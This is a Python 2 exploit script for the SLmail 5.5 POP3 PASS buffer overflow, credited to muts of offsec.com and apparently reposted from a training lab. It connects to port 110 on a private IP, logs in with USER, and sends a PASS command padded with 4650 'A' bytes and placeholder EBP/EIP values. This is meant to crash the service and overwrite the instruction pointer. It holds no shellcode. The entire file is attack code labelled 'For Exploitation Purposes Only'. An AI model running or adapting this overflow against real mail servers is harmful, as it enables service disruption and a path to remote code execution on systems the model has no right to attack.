#https://www.facebook.com/abhishek.sahu.3998263/
# Subscribed by Abhishek Shau
import struct
import socket

print "\n\n#########"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Exploitation Purposes Only!" 
print "\n\n########"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = '\x41' * 4650
ebp = "ABCD"	#41424344
eip = "DEAB"	#44454142
stack = buffer + ebp + eip

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.195.132',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + stack + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Try connecting to port on victim machine."
except:
	print "Could not connect to Abhi!"
